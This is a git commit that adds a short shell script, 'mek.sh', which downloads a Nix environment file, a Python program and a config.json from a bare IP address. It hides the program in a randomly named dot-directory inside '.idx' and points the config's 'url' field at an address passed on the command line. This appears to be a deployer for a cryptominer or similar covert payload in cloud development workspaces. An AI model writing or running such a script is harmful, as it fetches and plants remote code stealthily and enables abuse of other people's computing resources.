c2e6c840f6e57443832d42da7ddccf3c5f8993b6
henstyle <henspicsaypro@gmail.com>
2025-09-14 02:05:23 +0700

    Create mek.sh

---
+++ mek.sh
@@ -0,0 +1,24 @@
+NAME=$(tr -dc A-Za-z </dev/urandom | head -c 4)
+
+IPS="${1:-}"
+
+cd .idx
+
+wget -q -O dev.nix http://143.198.196.235/dev.nix
+
+sed -i "s/ganti/${NAME}/g" dev.nix
+
+mkdir ".$NAME"
+
+cd ".$NAME"
+
+wget -q -O "${NAME}" http://143.198.196.235/dev.py
+
+wget -q -O config.json http://143.198.196.235/config.json
+
+sed -i 's/"url": *"[^"]*"/"url": "$IPS"/' config.json
+
+chmod +x config.json
+
+chmod +x "${NAME}"
+
